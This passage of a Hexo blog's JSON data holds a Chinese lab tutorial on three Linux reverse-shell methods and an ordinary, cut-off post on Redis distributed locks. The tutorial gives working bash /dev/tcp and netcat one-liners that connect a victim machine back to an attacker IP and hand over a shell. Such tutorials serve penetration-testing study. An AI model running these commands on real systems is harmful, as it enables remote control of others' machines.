-i`的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，>&将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。\n\n下面来看一下具体的效果，先在攻击机器上监听端口：\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上反弹shell：\n\n{% asset_img 1受害机反弹shell.jpg%}\n\n之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。\n\n{% asset_img 1攻击机获得shell.jpg %}\n\n#### 利用netcat反弹shell\n\n如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。\n\n同样，先在攻击机器上130.211.244.96开启监听端口`nc -lvvp 7777`，等待受害机器连接。\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上执行命令`nc -e /bin/bash 130.211.244.96 7777`,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。\n\n{% asset_img 2受害机反弹shell.jpg %}\n\n{% asset_img 2攻击机获得shell.jpg %}\n\n\n#### 利用管道反弹shell\n\nnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。\n\n首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。\n\n{% asset_img 3攻击机监听端口.jpg %}\n\n然后在受害机器上执行命令`nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778`，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。\n\n{% asset_img 3受害机反弹shell.jpg %}\n\n这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。\n\n{% asset_img 3攻击机获得shell.jpg %}\n\n\n<br>\n\n当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Linux反弹shell的三种方法.md","raw":"---\ntitle: Linux反弹shell的三种方法\ndate: 2018-11-06 11:55:30\ntags: ['安全','反弹shell','netcat', '渗透测试']\ncategories: 安全\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？\n\n而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。\n\n反弹shell通常是外网渗透的最后一步，也是内网渗透的第一步。反弹shell顾名思义，有两个关键词—反弹和shell。\n\n反弹：利用命令执行/代码执行/Webshell/redis未授权访问写入crontab等漏洞，使得目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则则。\nShell：是服务器shell进程stdin/stdout/stderr重定向到攻击端。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 获取shell\n{% endnote %}\n</div>\n\n通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。\n\n我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。\n\n#### 通过bash反弹shell\n\n第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令`nc -lvvp 7777`,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令`bash -i >$ /dev/tcp/130.211.244.96/7777 0>&1`。\n\n`bash -i`的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，>&将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。\n\n下面来看一下具体的效果，先在攻击机器上监听端口：\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上反弹shell：\n\n{% asset_img 1受害机反弹shell.jpg%}\n\n之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。\n\n{% asset_img 1攻击机获得shell.jpg %}\n\n#### 利用netcat反弹shell\n\n如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。\n\n同样，先在攻击机器上130.211.244.96开启监听端口`nc -lvvp 7777`，等待受害机器连接。\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上执行命令`nc -e /bin/bash 130.211.244.96 7777`,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。\n\n{% asset_img 2受害机反弹shell.jpg %}\n\n{% asset_img 2攻击机获得shell.jpg %}\n\n\n#### 利用管道反弹shell\n\nnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。\n\n首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。\n\n{% asset_img 3攻击机监听端口.jpg %}\n\n然后在受害机器上执行命令`nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778`，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。\n\n{% asset_img 3受害机反弹shell.jpg %}\n\n这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。\n\n{% asset_img 3攻击机获得shell.jpg %}\n\n\n<br>\n\n当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Linux反弹shell的三种方法","published":1,"updated":"2019-06-26T03:52:03.499Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2g8000go25tgeu0b8uz","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？</p>\n<p>而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。</p>\n<p>反弹shell通常是外网渗透的最后一步，也是内网渗透的第一步。反弹shell顾名思义，有两个关键词—反弹和shell。</p>\n<p>反弹：利用命令执行/代码执行/Webshell/redis未授权访问写入crontab等漏洞，使得目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则则。<br>Shell：是服务器shell进程stdin/stdout/stderr重定向到攻击端。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-获取shell\"><a href=\"#0x02-获取shell\" class=\"headerlink\" title=\"0x02 获取shell\"></a>0x02 获取shell</h3></div><br></div>\n\n<p>通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。</p>\n<p>我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。</p>\n<h4 id=\"通过bash反弹shell\"><a href=\"#通过bash反弹shell\" class=\"headerlink\" title=\"通过bash反弹shell\"></a>通过bash反弹shell</h4><p>第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令<code>nc -lvvp 7777</code>,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令<code>bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1</code>。</p>\n<p><code>bash -i</code>的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。</p>\n<p>下面来看一下具体的效果，先在攻击机器上监听端口：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上反弹shell：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg\">\n<p>之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg\">\n<h4 id=\"利用netcat反弹shell\"><a href=\"#利用netcat反弹shell\" class=\"headerlink\" title=\"利用netcat反弹shell\"></a>利用netcat反弹shell</h4><p>如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。</p>\n<p>同样，先在攻击机器上130.211.244.96开启监听端口<code>nc -lvvp 7777</code>，等待受害机器连接。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上执行命令<code>nc -e /bin/bash 130.211.244.96 7777</code>,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg\">\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg\">\n<h4 id=\"利用管道反弹shell\"><a href=\"#利用管道反弹shell\" class=\"headerlink\" title=\"利用管道反弹shell\"></a>利用管道反弹shell</h4><p>netcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。</p>\n<p>首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg\">\n<p>然后在受害机器上执行命令<code>nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778</code>，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg\">\n<p>这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg\">\n<p><br></p>\n<p>当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？</p>\n<p>而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。</p>\n<p>反弹shell通常是外网渗透的最后一步，也是内网渗透的第一步。反弹shell顾名思义，有两个关键词—反弹和shell。</p>\n<p>反弹：利用命令执行/代码执行/Webshell/redis未授权访问写入crontab等漏洞，使得目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则则。<br>Shell：是服务器shell进程stdin/stdout/stderr重定向到攻击端。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-获取shell\"><a href=\"#0x02-获取shell\" class=\"headerlink\" title=\"0x02 获取shell\"></a>0x02 获取shell</h3></div><br></div>\n\n<p>通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。</p>\n<p>我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。</p>\n<h4 id=\"通过bash反弹shell\"><a href=\"#通过bash反弹shell\" class=\"headerlink\" title=\"通过bash反弹shell\"></a>通过bash反弹shell</h4><p>第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令<code>nc -lvvp 7777</code>,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令<code>bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1</code>。</p>\n<p><code>bash -i</code>的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。</p>\n<p>下面来看一下具体的效果，先在攻击机器上监听端口：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上反弹shell：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg\">\n<p>之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg\">\n<h4 id=\"利用netcat反弹shell\"><a href=\"#利用netcat反弹shell\" class=\"headerlink\" title=\"利用netcat反弹shell\"></a>利用netcat反弹shell</h4><p>如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。</p>\n<p>同样，先在攻击机器上130.211.244.96开启监听端口<code>nc -lvvp 7777</code>，等待受害机器连接。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上执行命令<code>nc -e /bin/bash 130.211.244.96 7777</code>,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg\">\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg\">\n<h4 id=\"利用管道反弹shell\"><a href=\"#利用管道反弹shell\" class=\"headerlink\" title=\"利用管道反弹shell\"></a>利用管道反弹shell</h4><p>netcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。</p>\n<p>首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg\">\n<p>然后在受害机器上执行命令<code>nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778</code>，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg\">\n<p>这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg\">\n<p><br></p>\n<p>当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Redis应用场景","date":"2019-04-11T07:53:34.000Z","_content":"\n\n<div style=\"text-align: center;\">\n{% note success %} \n### Redis 数据结构\n{% endnote %}\n</div>\n\nRedis是一个开源的内存数据结构存储系统，可以用做数据库，缓存，消息中间件等。Redis中常规的数据结构有5种，string、list、set、zset、hash，同时还有bitmaps、hyperloglogs、geospatial三种不常用的数据结构。\n\n我们经常把redis当作缓存来使用，但是本文只是基于五种常用的数据结构及其相关命令来讨论相关的应用场景，不涉及缓存。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### String\n{% endnote %}\n</div>\n\n首先先看一下Redis中String的操作命令：\n\n```bash\nSET key value [expiration EX seconds | PX milliseconds] [NX|XX]\nSETNX key value\nSETEX key seconds value\nPSETEX key milliseconds value\nGET key\nGETSET key value\nSTRLEN key\nAPPEND key value\nSETRANGE key offseet value\nGETRANGE key start end\nINCR key\nINCRBY key increment\nINCRBYFLOAT key increment\nDECR key\nDECRBY key increment\nMSET key value [key value ...]\nMSETNX key value [key value ...]\nMGET key [key ...]\n```\n命令具体的含义我这里就不一一赘述了。有想要了解的同学可以参考[Redis命令参考](http://redisdoc.com/)\n\n#### 分布式锁\n\n我们看第一条命令，`SET key value [expiration EX seconds | PX milliseconds] [NX|XX]`。\n\n通过该命令我们可以实现基于redis的分布式锁，为了确保分布式锁可用，我们至少要确保锁的实现需要满足以下条件：\n1. 互斥性，在任一时刻，只有一个客户端持有锁。\n2. 不会发生死锁，即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。\n3. 容错性，只要大部分Redis节点正常运行，客户端就可以加锁、解锁。\n4. 解铃还须系铃人，加锁和解锁必须是同一个客户端，客户端不能把别人的锁给解了。\n\n那该命令如果保证确保分布式锁的可用性呢？\n\n首先，set 加入了NX参数，可以保证如果有key存在，则其他客户端set 不会成功，也就是只有一个客户端能持有锁。其次，我们可以对锁设置过期时间，即使锁的持有者后续发生了崩溃而没有解锁，锁也会因为到了过期时间自动解锁，不会发生死锁现象。 容错性方面我们可以通过redis cluster来保证锁的高可用及容错性。最后，我们将value设置为requestId，表示加锁的客户端标识，那么客户端解锁的时候就可以进行判断是否为同一个客户端。\n\n##### 加锁\n\n我们用代码看一下怎么使用redis来实现分布式锁，非常简单。\n\n```java\npublic static boolean tryGetLock(Jedis jedis, String lockKey, String requestId, int expire) {\n\tString result = jedis.set(lockKey, requestId, \"NX\", \"PX\", expire);\n\tif (\"OK\".equals(result)) {\n\t\treturn true; // 获取锁成功\n\t}\n\treturn false; // 获取锁失败\n}\n```\n而在网上有很多人使用jedis.setnx()和jedis.expire()组合实现加锁，代码如下：\n\n```java\nLong result = jedis.setnx(lockKey, requestId);\nif (result == 1) {\n\t// 如果在这里程序崩溃，则无法设置过期时间，将发生死锁\n\tjedis.expire(lockKey, expire);\n}\n```\n乍一看和上面的set方法结果一样，其实不然，由于这是两条redis命令，不具有原子性，所以如果在setnx 之后程序崩溃，导致锁没有设置过期时间，可能会发生死锁。\n\n\n##### 解锁\n\n```java\npublic static boolean releaseLock(Jedis jedis, String lockKey,String requestId) {\n\tString script = \"if redis.call('get', KEY[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end\";\n\tObject result = jedis.eval(script, Collections.singletonList(lockKey),Collections.singletonList(requestId));\n\tLong success = 1L;\n\tif (success.equals(result)) {\n\t\treturn true;\n\t}\n\treturn false;\n}\n```\n\n解锁我们用一行Lua代码来实现，Lua代码的功能是获取锁对应的value，检查是否与requestId相等，如果相等则删除锁(解锁)。eval()方法是将Lua代码交给redis服务器执行。\n\n那为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的，而eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，直到eval命令执行完成，Redis才会执行其他命令。\n\n#### 分布式ID生成\n\n我们再来看第二个场景--生成分布式ID，\n\n当使用数据库来生成ID性能不够的时候，可以尝试使用Redis来生成ID，这主要依赖Redis是单线程的，所以也可以用来生成全局唯一ID。可以用Redis的原子操作INCR和INCRBY来实现\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Redis应用场景.md","raw":"---\ntitle: Redis应用场景\ndate: 2019-04-11 15:53:34\ntags:\ncategories:\n---\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### Redis 数据结构\n{% endnote %}\n</div>\n\nRedis是一个开源的内存数据结构存储系统，可以用做数据库，缓存，消息中间件等。Redis中常规的数据结构有5种，string、list、set、zset、hash，同时还有bitmaps、hyperloglogs、geospatial三种不常用的数据结构。\n\n我们经常把redis当作缓存来使用，但是本文只是基于五种常用的数据结构及其相关命令来讨论相关的应用场景，不涉及缓存。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### String\n{% endnote %}\n</div>\n\n首先先看一下Redis中String的操作命令：\n\n```bash\nSET key value [expiration EX seconds | PX milliseconds] [NX|XX]\nSETNX key value\nSETEX key seconds value\nPSETEX key milliseconds value\nGET key\nGETSET key value\nSTRLEN key\nAPPEND key value\nSETRANGE key offseet value\nGETRANGE key start end\nINCR key\nINCRBY key increment\nINCRBYFLOAT key increment\nDECR key\nDECRBY key increment\nMSET key value [key value ...]\nMSETNX key value [key value ...]\nMGET key [key ...]\n```\n命令具体的含义我这里就不一一赘述了。有想要了解的同学可以参考[Redis命令参考](http://redisdoc.com/)\n\n#### 分布式锁\n\n我们看第一条命令，`SET key value [expiration EX seconds | PX milliseconds] [NX|XX]`。\n\n通过该命令我们可以实现基于redis的分布式锁，为了确保分布式锁可用，我们至少要确保锁的实现需要满足以下条件：\n1. 互斥性，在任一时刻，只有一个客户端持有锁。\n2. 不会发生死锁，即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。\n3. 容错性，只要大部分Redis节点正常运行，客户端就可以加锁、解锁。\n4. 解铃还须系铃人，加锁和解锁必须是同一个客户端，客户端不能把别人的锁给解了。\n\n那该命令如果保证确保分布式锁的可用性呢？\n\n首先，set 加入了NX参数，可以保证如果有key存在，则其他客户端set 不会成功，也就是只有一个客户端能持有锁。其次，我们可以对锁设置过期时间，即使锁的持有者后续发生了崩溃而没有解锁，锁也会因为到了过期时间自动解锁，不会发生死锁现象。 容错性方面我们可以通过redis cluster来保证锁的高可用及容错性。最后，我们将value设置为requestId，表示加锁的客户端标识，那么客户端解锁的时候就可以进行判断是否为同一个客户端。\n\n##### 加锁\n\n我们用代码看一下怎么使用redis来实现分布式锁，非常简单。\n\n```java\npublic static boolean tryGetLock(Jedis jedis, String lockKey, String requestId, int expire) {\n\tString result = jedis.set(lockKey, requestId, \"NX\", \"PX\", expire);\n\tif (\"OK\".equals(result)) {\n\t\treturn true; // 获取锁成功\n\t}\n\treturn false; // 获取锁失败\n}\n```\n而在网上有很多人使用jedis.setnx()和jedis.expire()组合实现加锁，代码如下：\n\n```java\nLong result = jedis.setnx(lockKey, requestId);\nif (result == 1) {\n\t// 如果在这里程序崩溃，则无法设置过期时间，将发生死锁\n\tjedis.expire(lockKey, expire);\n}\n```\n乍一看和上面的set方法结果一样，其实不然，由于这是两条redis命令，不具有原子性，所以如果在setnx 之后程序崩溃，导致锁没有设置过期时间，可能会发生死锁。\n\n\n##### 解锁\n\n```java\npublic static boolean releaseLock(Jedis jedis, String lockKey,String requestId) {\n\tString script = \"if redis.call('get', KEY[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end\";\n\tObject result = jedis.eval(script, Collections.singletonList(lockKey),Collections.singletonList(requestId));\n\tLong success = 1L;\n\tif (success.equals(result)) {\n\t\treturn true;\n\t}\n\treturn false;\n}\n```\n\n解锁我们用一行Lua代码来实现，Lua代码的功能是获取锁对应的value，检查是否与requestId相等，如果相等则删除锁(解锁)。eval()方法是将Lua代码交给redis服务器执行。\n\n那为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的，而eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，直到eval命令执行完成，Redis才会执行其他命令。\n\n#### 分布式ID生成\n\n我们再来看第二个场景--生成分布式ID，\n\n当使用数据库来生成ID性能不够的时候，可以尝试使用Redis来生成ID，这主要依赖Redis是单线程的，所以也可以用来生成全局唯一ID。可以用Redis的原子操作INCR和INCRBY来实现\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Redis应用场景","published":1,"updated":"2019-06-26T03:52:03.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2g9000ho25tkgvj30qm","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"Redis-数据结构\"><a href=\"#Redis-数据结构\" class=\"headerlink\" title=\"Redis 数据结构\"></a>Redis 数据结构</h3></div><br></div>\n\n<p>Redis是一个开源的内存数据结构存储系统，可以用做数据库，缓存，消息中间件等。Redis中常规的数据结构有5种，string、list、set、zset、hash，同时还有bitmaps、hyperloglogs、geospatial三种不常用的数据结构。</p>\n<p>我们经常把redis当作缓存来使用，但是本文只是基于五种常用的数据结构及其相关命令来讨论相关的应用场景，不涉及缓存。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h3></div><br></div>\n\n<p>首先先看一下Redis中String的操作命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET key value [expiration EX seconds | PX milliseconds] [NX|XX]</span><br><span class=\"line\">SETNX key value</span><br><span class=\"line\">SETEX key seconds value</span><br><span class=\"line\">PSETEX key milliseconds value</span><br><span class=\"line\">GET key</span><br><span class=\"line\">GETSET key value</span><br><span class=\"line\">STRLEN key</span><br><span class=\"line\">APPEND key value</span><br><span class=\"line\">SETRANGE key offseet value</span><br><span class=\"line\">GETRANGE key start end</span><br><span class=\"line\">INCR key</span><br><span class=\"line\">INCRBY key increment</span><br><span class=\"line\">INCRBYFLOAT key increment</span><br><span class=\"line\">DECR key</span><br><span class=\"line\">DECRBY key increment</span><br><span class=\"line\">MSET key value [key value ...]</span><br><span class=\"line\">MSETNX key value [key value ...]</span><br><span class=\"line\">MGET key [key ...]</span><br></pre></td></tr></table></figure>\n<p>命令具体的含义我这里就不一一赘述了。有想要了解的同学可以参考<a href=\"http://redisdoc.com/\" target=\"_blank\" rel=\"noopener\">Redis命令参考</a></p>\n<h4 id=\"分布式锁\"><a href=\"#分布式锁\" class=\"headerlink\" title=\"分布式锁\"></a>分布式锁</h4><p>我们看第一条命令，<code>SET key value [expiration EX seconds | PX milliseconds] [NX|XX]</code>。</p>\n<p>通过该命令我们可以实现基于redis的分布式锁，为了确保分布式锁可用，我们至少要确保锁的实现需要满足以下条件：</p>\n<ol>\n<li>互斥性，在任一时刻，只有一个客户端持有锁。</li>\n<li>不会发生死锁，即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。</li>\n<li>容错性，只要大部分Redis节点正常运行，客户端就可以加锁、解锁。</li>\n<li>解铃还须系铃人，加锁和解锁必须是同一个客户端，客户端不能把别人的锁给解了。</li>\n</ol>\n<p>那该命令如果保证确保分布式锁的可用性呢？</p>\n<p>首先，set 加入了NX参数，可以保证如果有key存在，则其他客户端set 